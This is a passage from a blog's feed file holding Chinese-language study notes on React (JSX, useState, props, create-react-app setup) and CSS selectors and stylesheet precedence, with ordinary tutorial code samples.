class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure><blockquote><p>Fragment 的详细用法：<a href="https://zh-hans.react.dev/reference/react/Fragment">React中文文档 | Fragment</a></p></blockquote></li><li><p><strong>标签属性设置</strong></p><ul><li>使用 <code>className</code> 来设置 CSS 的class</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import image from &#x27;./logo.svg&#x27;</span><br><span class="line">function App() &#123;</span><br><span class="line">  const imgData = &#123;</span><br><span class="line">    className: &#x27;small&#x27;,</span><br><span class="line">    style: &#123;</span><br><span class="line">      width: 200,</span><br><span class="line">      height: 200,</span><br><span class="line">      backgroundColor: &#x27;grey&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        src=&#123;image&#125;</span><br><span class="line">        alt=&quot;&quot;</span><br><span class="line">        &#123;...imgData&#125;</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure></li></ol><h1 id="react-hook"><a class="markdownIt-Anchor" href="#react-hook"></a> react hook</h1><ol><li><p><strong>基本概念</strong></p><p>react的思想在于将组件尽量写成纯函数，如果需要外部功能和副作用，就用钩子把外部代码&quot;钩&quot;进来。</p><p>react Hooks 是一些可以让你在函数组件中“钩入” React 状态和生命周期功能的特殊函数。它们可以解决一些 class 组件中常见的问题，并且使代码更加简洁和可读。</p><p>因为所有的钩子都是为函数引入外部功能，所以 React 约定，<strong>钩子一律使用<code>use</code>前缀命名</strong>，便于识别。你要使用 xxx 功能，钩子就命名为 usexxx。</p><blockquote><p>react hook的功能在某些方面比较类似于库函数，对一些特定的功能进行了封装，可以更加方便地重复使用。但是不同的是库函数式独立的，不依赖于特定的上下文或框架，例如，数学库函数（如<code>Math.sqrt</code>）可以在任何 JavaScript 代码中使用。但是react hook只能在React 函数组件或自定义 Hook 中使用。</p></blockquote></li><li><p><strong>React 内置 Hook</strong></p><p><strong>1）useState()</strong></p><ul><li><p>定义：用于在函数组件中进行状态变更</p></li><li><p>语法：</p><ul><li><p>content：需要渲染的内容</p></li><li><p>setContent：用于更新状态的函数, 后续调用该函数进行状态更新操作。</p><blockquote><p><strong>注意在对对象进行更新的时候，一定要把所有的键值对都写上去</strong>，即使没有改变也要写，因为这里的逻辑是用新的对象直接覆盖掉原有的对象，如果没有将不变的键值对写上去会直接失去这些键值对。</p><p>将所有属性都写上去又比较繁琐，所以我们可以在前面加上 <strong><code>...content</code></strong>，表示将content的所有属性先写在这里，后面再写上需要改变的键值对来覆盖掉前面的值。</p></blockquote></li><li><p>useState()内接收状态的初始值。</p><p>这里的初始内容可以为变量、对象的形式</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const [content, setContent] = useState(&quot;初始内容&quot;);</span><br><span class="line">const [content,setContent] = useState(&#123;</span><br><span class="line">    title: &#x27;默认标题&#x27;,</span><br><span class="line">    content: &#x27;默认内容&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// setContent后面为更新后的内容</span><br><span class="line">setContent(&#x27;新内容&#x27;)</span><br><span class="line">function handClick()&#123;</span><br><span class="line">    setContent(&#123;</span><br><span class="line">        ...content,</span><br><span class="line">        content: &#x27;新内容&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; useState &#125; from &quot;react&quot;;</span><br><span class="line"></span><br><span class="line">export default function  Button()  &#123;</span><br><span class="line">  const  [buttonText, setButtonText] =  useState(&quot;Click me,   please&quot;);</span><br><span class="line"></span><br><span class="line">  function handleClick()  &#123;</span><br><span class="line">    return setButtonText(&quot;Thanks, been clicked!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return  &lt;button  onClick=&#123;handleClick&#125;&gt;&#123;buttonText&#125;&lt;/button&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="初始化应用"><a class="markdownIt-Anchor" href="#初始化应用"></a> 初始化应用</h1><ol><li><p><strong>环境要求</strong></p><ul><li><p>安装 Node.js。Node 包括 npm（Node 程序包管理器）和 npx（Node 程序包运行器）</p><ul><li>也可以使用Yarn作为npm的替代方案</li></ul></li><li><p>设置npm的镜像源</p><ul><li><p>查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure></li><li><p>更改为淘宝源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>初始化应用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app reacttest</span><br></pre></td></tr></table></figure><ul><li><p>输入命令后会在 reacttest 文件夹下面构建好应用程序的基础架构</p><p><strong>注意项目名字只能是小写，不能大小写混合</strong></p></li><li><p>处理完成之后，可以 cd 到 <code>reacttest</code> 文件夹下，然后键入 <code>npm start</code> 命令并回车，先前由 create-react-app 创建的脚本会启动一个本地服务 <a href="localhost:3000">localhost:3000</a>，并打开你的默认浏览器来访问这个服务。成功启动浏览器的话，你的浏览器上会显示如下画面，表示初始化成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240718165830913.png" alt="image-20240718165830913" /></p></li></ul></li><li><p><strong>文件结构</strong></p><ul><li><p>src文件夹： 存放React 应用源码的目录。</p><p>可以保留该目录下的这两个文件，其他文件都不重要，可以直接全部删除</p><ul><li><p><code>index.js</code> ：入口文件</p></li><li><p><code>APP.js</code> ：根组件文件</p><blockquote><p>react中的一个重要思想：其包括两种组件形式</p><ul><li>函数形式（主流）</li><li>类形式</li></ul></blockquote></li></ul></li></ul></li><li><p><strong>APP.js组件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import logo from &quot;./logo.svg&quot;;</span><br><span class="line">import &quot;./App.css&quot;;</span><br><span class="line"></span><br><span class="line">function App() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div className=&quot;App&quot;&gt;</span><br><span class="line">      &lt;header className=&quot;App-header&quot;&gt;</span><br><span class="line">        &lt;img src=&#123;logo&#125; className=&quot;App-logo&quot; alt=&quot;logo&quot; /&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">          Edit &lt;code&gt;src/App.js&lt;/code&gt; and save to reload.</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;a</span><br><span class="line">          className=&quot;App-link&quot;</span><br><span class="line">          href=&quot;https://reactjs.org&quot;</span><br><span class="line">          target=&quot;_blank&quot;</span><br><span class="line">          rel=&quot;noopener noreferrer&quot;&gt;</span><br><span class="line">          Learn React</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure><p>可以看到组件文件由三部分组成：import语句、APP组件函数和底部的export语句</p><ul><li><p>import语句：允许在此脚本中使用其他文件中的代码</p><p>在这里引入我们需要的本地文件，包括css、图片等</p></li><li><p>APP组件函数</p><p>返回一个JSX表达式，<strong>该表达式定义了浏览器最终需要渲染的DOM</strong></p></li><li><p>export语句：在 <code>App.js</code> 文件的最底部</p><p><code>export default App</code> 语句使得 <code>App</code> 组件能被其他模块使用。</p></li></ul><p>**插值的实现：**通过括号 + 变量名称。可以在标签内容和属性部分进行插值</p><ul><li>注意使用{}进行插值的方式</li><li>注意jsx的语法，在给divContent赋值的时候并不需要使用引号，直接写标签即可</li></ul></li><li><p><strong>index.js入口文件</strong></p></li></ol><h1 id="渲染方式"><a class="markdownIt-Anchor" href="#渲染方式"></a> 渲染方式</h1><ol><li><p><strong>条件渲染</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const divTitle = &#x27;标签标题&#x27;</span><br><span class="line">  const flag = true</span><br><span class="line"></span><br><span class="line">  let divContent = null</span><br><span class="line">  if (flag)&#123;</span><br><span class="line">    divContent = &lt;span&gt;flag为true&lt;/span&gt;</span><br><span class="line">  &#125; else&#123;</span><br><span class="line">    divContent = &lt;p&gt;flag为false&lt;/p&gt;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div title = &#123;divTitle&#125;&gt;&#123;divContent&#125;&lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure></li><li><p><strong>数组渲染</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function App()&#123;</span><br><span class="line">  const list = [</span><br><span class="line">    &#123;id : 1, name : &#x27;a&#x27;&#125;,</span><br><span class="line">    &#123;id : 2, name : &#x27;b&#x27;&#125;, </span><br><span class="line">    &#123;id : 3, name : &#x27;c&#x27;&#125;</span><br><span class="line">  ]</span><br><span class="line">  const listConent = list.map(item =&gt; (</span><br><span class="line">    &lt;li key = &#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">    // 下面这样会报warning，没有key，没有唯一性</span><br><span class="line">    //&lt;li&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">  ))</span><br><span class="line"></span><br><span class="line">  return(</span><br><span class="line">    &lt;ul&gt;&#123;listConent&#125;&lt;/ul&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure><ul><li><p>在react中遍历数据时，推荐在组件中使用 key 属性。这里的数组最好要设置一个key，保证当前元素的唯一性（即上面的id，一般在后端设置好这样的形态再返回到前端）</p><blockquote><p>这样处理的原因是可以适配diff算法，更高效地创建react元素树以更新UI</p><p>详情可以参考：<a href="https://blog.csdn.net/Golden_soft/article/details/83090785">React总结：一文知React</a></p></blockquote></li></ul></li><li><p><strong>响应事件与状态更新</strong></p><p>注意要使用 useState 进行状态的更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import &#123; useState &#125; from &#x27;react&#x27;;</span><br><span class="line">function App()&#123;</span><br><span class="line">  const [content,setContent] = useState(&quot;初始内容&quot;)</span><br><span class="line"></span><br><span class="line">  function handClick()&#123;</span><br><span class="line">    setContent(&quot;新内容&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;div&gt;&#123;content&#125;&lt;/div&gt;</span><br><span class="line">      &lt;button onClick=&#123;handClick&#125;&gt;按钮&lt;/button&gt;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure></li></ol><h1 id="组件间数据共享props"><a class="markdownIt-Anchor" href="#组件间数据共享props"></a> 组件间数据共享：props</h1><h2 id="父组件传递数据给子组件"><a class="markdownIt-Anchor" href="#父组件传递数据给子组件"></a> 父组件传递数据给子组件</h2><ol><li><p>定义：React 组件使用 <em>props</em> 来互相通信。每个父组件都可以提供 props 给它的子组件，从而将一些信息传递给它</p></li><li><p>语法：</p><ul><li><p>预定义 props 后将其传递给子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 父组件Profile将person和size传递给子组件Avatar</span><br><span class="line">export default function Profile() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;Avatar</span><br><span class="line">      // 这里为什么使用双括号：第一个括号表示传递，第二个括号是表示对象</span><br><span class="line">      person=&#123;&#123; name: &#x27;Lin Lanying&#x27;, imageId: &#x27;1bX5QH6&#x27; &#125;&#125;</span><br><span class="line">      size=&#123;100&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在子组件中读取 props</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 在子组件中读取 person 和 size</span><br><span class="line">function Avatar(&#123; person, size = 100 &#125;) &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;img</span><br><span class="line">      className=&quot;avatar&quot;</span><br><span class="line">      src=&#123;getImageUrl(person)&#125;</span><br><span class="line">      alt=&#123;person.name&#125;</span><br><span class="line">      width=&#123;size&#125;</span><br><span class="line">      height=&#123;size&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>size = 100</code> ：设置Prop的默认值</li></ul></li></ul></li><li><p>将 JSX 作为子组件传递（组件插槽）</p><ul><li><p>可以直接将JSX传递，父组件将在名为 <code>children</code> 的 prop 中接收到该内容。使用标签头和标签尾来闭合</p></li><li><p>如果除了 children 中的 JSX ，还想要传递一些预定义的 prop的话，也可以设置自闭和传递</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function List(&#123; children, title, footer = &lt;div&gt;默认底部&lt;/div&gt; &#125;) &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;h2&gt;&#123;title&#125;&lt;/h2&gt;</span><br><span class="line">      &lt;ul&gt;</span><br><span class="line">        &#123;children&#125;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &#123;footer&#125;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default function App() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;List</span><br><span class="line">        title=&quot;列表1&quot;</span><br><span class="line">        footer=&#123;&lt;p&gt;这是底部内容1&lt;/p&gt;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;li&gt;内容1&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容2&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容3&lt;/li&gt;</span><br><span class="line">      &lt;/List&gt;</span><br><span class="line">      &lt;List</span><br><span class="line">        title=&quot;列表2&quot;</span><br><span class="line">        footer=&#123;&lt;p&gt;这是底部内容2&lt;/p&gt;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;li&gt;内容A&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容B&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容C&lt;/li&gt;</span><br><span class="line">      &lt;/List&gt;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="子组件传递数据给父组件"><a class="markdownIt-Anchor" href="#子组件传递数据给父组件"></a> 子组件传递数据给父组件</h2><p>这里想要在子组件中status的值发生变化后，<strong>回传</strong>status给父组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import &#123; useState &#125; from &quot;react&quot;;</span><br><span class="line"></span><br><span class="line">// 子组件调用父组件传递过来的函数，将发生变化的值传递到父组件中的function handleActive中</span><br><span class="line">function Detail(&#123; onActive &#125;) &#123;</span><br><span class="line">  const [status, setStatus] = useState(false);</span><br><span class="line"></span><br><span class="line">  function handleClick() &#123;</span><br><span class="line">    setStatus(!status);</span><br><span class="line">    // 调用父组件传递过来的函数</span><br><span class="line">    onActive(status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;handleClick&#125;&gt;按钮&lt;/button&gt;</span><br><span class="line">      &lt;p style=&#123;&#123; display: status ? &#x27;block&#x27; : &#x27;none&#x27; &#125;&#125;&gt;Detail的内容&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 父组件传递一个函数handleActive给子组件</span><br><span class="line">export default function App() &#123;</span><br><span class="line">  function handleActive(status) &#123;</span><br><span class="line">    console.log(status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;Detail onActive=&#123;handleActive&#125; /&gt;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="同级组件之间的数据传递"><a class="markdownIt-Anchor" href="#同级组件之间的数据传递"></a> 同级组件之间的数据传递</h2><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a href="https://yixirumeng.github.io/2018/10/08/react-and-vue2-component-single-root/">分析React、Vue组件为什么必须只能有一个根元素</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』CSS学习</title>
      <link href="/posts/192b.html"/>
      <url>/posts/192b.html</url>
      
        <content type="html"><![CDATA[<p>本文记录对HTML基础知识的学习，主要内容基于 <a href="https://www.runoob.com/css/css-tutorial.html">CSS 教程 | 菜鸟教程</a></p><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>定义</strong></p><p><strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，CSS文件扩展名为 <code>.css</code>。</p></li><li><p><strong>CSS文档的基本结构</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240711103357915.png" alt="image-20240711103357915" /></p></li></ol><h1 id="id选择器和class选择器"><a class="markdownIt-Anchor" href="#id选择器和class选择器"></a> id选择器和class选择器</h1><ol><li><p><strong>id选择器</strong></p><p>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式，以 “#” 来定义。</p><p>以下的样式规则应用于元素属性 id=“para1”:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#para1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>class选择器</strong></p><p>class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。类选择器以一个点 <code>.</code> 号显示：</p><ul><li><p>在以下的例子中，所有拥有 center 类的 HTML 元素均为居中。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.center</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br></pre></td></tr></table></figure></li><li><p>还可以指定特定的HTML元素使用class</p><p>在以下实例中, 所有的 p 元素使用 class=“center” 让该元素的文本居中:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.center</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>class可以在多个元素中使用，class之间以空格分隔即可</p><p>例如这里的p标签就使用了center和color两个class，以空格分隔开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;center color&quot;</span>&gt;</span>段落居中，颜色为红色。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>标签选择器（直接对某个标签定义样式）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="样式表"><a class="markdownIt-Anchor" href="#样式表"></a> 样式表</h1><ol><li><p><strong>插入样式表的方法</strong></p><p>有三种，在HTML学习的博客中已经进行了详细的介绍</p><ul><li><p>外部样式表(External style sheet)</p></li><li><p>内部样式表(Internal style sheet)</p></li><li><p>内联样式(Inline style)</p></li></ul></li><li><p><strong>多重样式</strong></p><ul><li><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从<strong>更具体的样式表</strong>中被<strong>继承</strong>过来。</p><p>如果在不同的样式表中出现了多个相同的属性，那么优先级如下：</p><p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p><p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">8pt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而内部样式表拥有针对 h3 选择器的两个属性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">20pt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">color</span>:red;</span><br><span class="line"><span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">20pt</span>;</span><br></pre></td></tr></table></figure><p>可以看到因为内部样式表的优先级高，先使用了内部样式表，然后又继承了外部样式表中的 <code>color</code> 属性</p></li></ul></li></ol><h1 id="编程快捷键"><a class="markdownIt-Anchor" href="#编程快捷键"></a> 编程快捷键</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w200+h200+bgc//设置class中的width、height和background-color</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』javascript学习</title>
      <link href="/posts/d00f.html"/>
      <url>/posts/d00f.html</url>
      
